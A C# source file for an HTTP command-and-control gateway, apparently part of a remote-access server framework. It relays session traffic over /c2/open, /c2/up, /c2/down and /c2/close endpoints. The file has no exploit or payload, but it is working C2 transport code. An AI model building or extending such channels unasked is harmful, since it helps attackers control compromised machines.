using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Networking
{
    internal sealed class HttpC2Gateway : IDisposable
    {
        private readonly HttpListener _listener = new HttpListener();
        private readonly ConcurrentDictionary<string, (HttpC2ServerStream Stream, Client Client)> _sessions = new ConcurrentDictionary<string, (HttpC2ServerStream, Client)>();
        private readonly Server _server;
        private readonly CancellationTokenSource _cts = new CancellationTokenSource();
        private readonly int _port;
        private bool _disposed;

        public HttpC2Gateway(Server server, int port = 8080)
        {
            _server = server ?? throw new ArgumentNullException(nameof(server));
            _port = port;
        }

        public void Start()
        {
            if (_disposed)
            {
                throw new ObjectDisposedException(nameof(HttpC2Gateway));
            }

            if (_listener.IsListening)
            {
                return;
            }

            var prefix = $"http://127.0.0.1:{_port}/";
            _listener.Prefixes.Clear();
            _listener.Prefixes.Add(prefix);
            _listener.Start();

            _ = Task.Run(ListenAsync, _cts.Token);
        }

        public void Stop()
        {
            if (!_listener.IsListening)
            {
                return;
            }

            _cts.Cancel();
            _listener.Stop();
        }

        public void Dispose()
        {
            if (_disposed)
            {
                return;
            }

            _disposed = true;
            Stop();

            foreach (var session in _sessions.Values)
            {
                session.Client?.Disconnect();
                session.Stream?.Dispose();
            }

            _listener.Close();
            _cts.Dispose();
        }

        private async Task ListenAsync()
        {
            while (!_cts.IsCancellationRequested)
            {
                HttpListenerContext context = null;
                try
                {
                    context = await _listener.GetContextAsync();
                    _ = Task.Run(() => HandleContextAsync(context), _cts.Token);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch
                {
                    await Task.Delay(500, _cts.Token).ConfigureAwait(false);
                }
            }
        }

        private async Task HandleContextAsync(HttpListenerContext context)
        {
            var request = context.Request;
            var response = context.Response;

            try
            {
                switch (request.Url.AbsolutePath.ToLowerInvariant())
                {
                    case "/c2/open":
                        await HandleOpenAsync(response).ConfigureAwait(false);
                        break;
                    case "/c2/up":
                        await HandleUpAsync(request, response).ConfigureAwait(false);
                        break;
                    case "/c2/down":
                        await HandleDownAsync(request, response).ConfigureAwait(false);
                        break;
                    case "/c2/close":
                        await HandleCloseAsync(request, response).ConfigureAwait(false);
                        break;
                    default:
                        response.StatusCode = 404;
                        break;
                }
            }
            catch
            {
                response.StatusCode = 500;
            }
            finally
            {
                response.OutputStream.Close();
            }
        }

        private async Task HandleOpenAsync(HttpListenerResponse response)
        {
            var sessionId = Guid.NewGuid().ToString("N");
            var stream = new HttpC2ServerStream(new IPEndPoint(IPAddress.Loopback, 0));
            var client = _server.AttachExternalStream(stream, stream.RemoteEndPoint);

            _sessions[sessionId] = (stream, client);

            var payload = Encoding.UTF8.GetBytes(sessionId);
            response.StatusCode = 200;
            response.ContentType = "text/plain";
            await response.OutputStream.WriteAsync(payload, 0, payload.Length).ConfigureAwait(false);
        }

        private async Task HandleUpAsync(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (!TryGetSession(request, out var session))
            {
                response.StatusCode = 404;
                return;
            }

            using (var ms = new MemoryStream())
            {
                await request.InputStream.CopyToAsync(ms).ConfigureAwait(false);
                var payload = ms.ToArray();
                if (payload.Length > 0)
                {
                    session.Stream.EnqueueIncoming(payload, 0, payload.Length);
                }
            }

            response.StatusCode = 200;
        }

        private async Task HandleDownAsync(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (!TryGetSession(request, out var session))
            {
                response.StatusCode = 404;
                return;
            }

            var data = session.Stream.DequeueOutgoing(30000, 1024 * 1024);
            if (data.Length > 0)
            {
                response.StatusCode = 200;
                response.ContentType = "application/octet-stream";
                await response.OutputStream.WriteAsync(data, 0, data.Length).ConfigureAwait(false);
            }
            else
            {
                response.StatusCode = 200;
            }
        }

        private async Task HandleCloseAsync(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (TryGetSession(request, out var session))
            {
                session.Client?.Disconnect();
                session.Stream?.Dispose();
                _sessions.TryRemove(GetSessionId(request), out _);
            }

            response.StatusCode = 200;
            await response.OutputStream.FlushAsync().ConfigureAwait(false);
        }

        private bool TryGetSession(HttpListenerRequest request, out (HttpC2ServerStream Stream, Client Client) session)
        {
            var sessionId = GetSessionId(request);
            return _sessions.TryGetValue(sessionId, out session);
        }

        private static string GetSessionId(HttpListenerRequest request)
        {
            return request.QueryString["sid"] ?? string.Empty;
        }
    }
}
